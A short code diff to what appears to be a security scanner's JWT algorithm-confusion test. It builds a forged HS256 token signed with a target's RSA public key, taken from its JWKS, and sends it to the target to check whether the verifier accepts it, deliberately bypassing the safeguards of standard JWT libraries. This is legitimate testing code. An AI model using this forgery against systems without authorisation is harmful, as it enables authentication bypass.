@@ -4875,10 +4875,15 @@ async def jwt_algorithm_confusion_test(
     for key_entry in await _jwt_fetch_jwks_rsa_keys(jwks_url):
 
         try:
-            import jwt as pyjwt
-
-            # Create HS256 token signed with public key as secret
-            forged_token = pyjwt.encode(payload, key_entry["pem"], algorithm='HS256')
+            # Secure JWT libraries intentionally reject asymmetric PEM material as an
+            # HMAC secret. This probe must still construct that malformed token to test
+            # whether the remote verifier makes the classic algorithm-confusion error.
+            forged_header = dict(header)
+            if key_entry.get("kid"):
+                forged_header["kid"] = key_entry["kid"]
+            forged_token = _jwt_hmac_token(
+                forged_header, payload, str(key_entry["pem"]), "HS256",
+            )
 
             # Test the forged token
             auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"authorization", "cookie"})
